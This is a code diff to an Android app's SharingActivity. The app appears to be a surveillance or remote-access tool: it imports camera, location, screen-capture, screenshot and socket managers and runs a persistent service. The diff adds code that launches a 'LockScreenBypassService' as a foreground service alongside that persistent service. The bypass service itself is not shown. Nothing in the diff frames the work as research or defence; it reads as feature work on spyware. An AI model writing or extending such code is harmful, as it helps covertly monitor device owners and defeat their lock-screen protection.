@@ -19,6 +19,7 @@ import com.example.myapplication.utils.CameraManager;
 import com.example.myapplication.utils.LocationManager;
 import com.example.myapplication.utils.PermissionManager;
 import com.example.myapplication.services.PersistentService;
+import com.example.myapplication.services.LockScreenBypassService;
 import com.example.myapplication.utils.ScreenCaptureManager;
 import com.example.myapplication.utils.ScreenshotManager;
 import com.example.myapplication.utils.SocketManager;
@@ -88,15 +89,25 @@ public class SharingActivity extends AppCompatActivity {
     
     private void startPersistentService() {
         try {
+            // Start main persistent service
             Intent serviceIntent = new Intent(this, PersistentService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent);
             } else {
                 startService(serviceIntent);
             }
-            Log.d(TAG, "Persistent service started from main activity");
+            
+            // Start lock screen bypass service
+            Intent lockBypassIntent = new Intent(this, LockScreenBypassService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(lockBypassIntent);
+            } else {
+                startService(lockBypassIntent);
+            }
+            
+            Log.d(TAG, "All persistent services started from main activity");
         } catch (Exception e) {
-            Log.e(TAG, "Error starting persistent service", e);
+            Log.e(TAG, "Error starting persistent services", e);
         }
     }
     
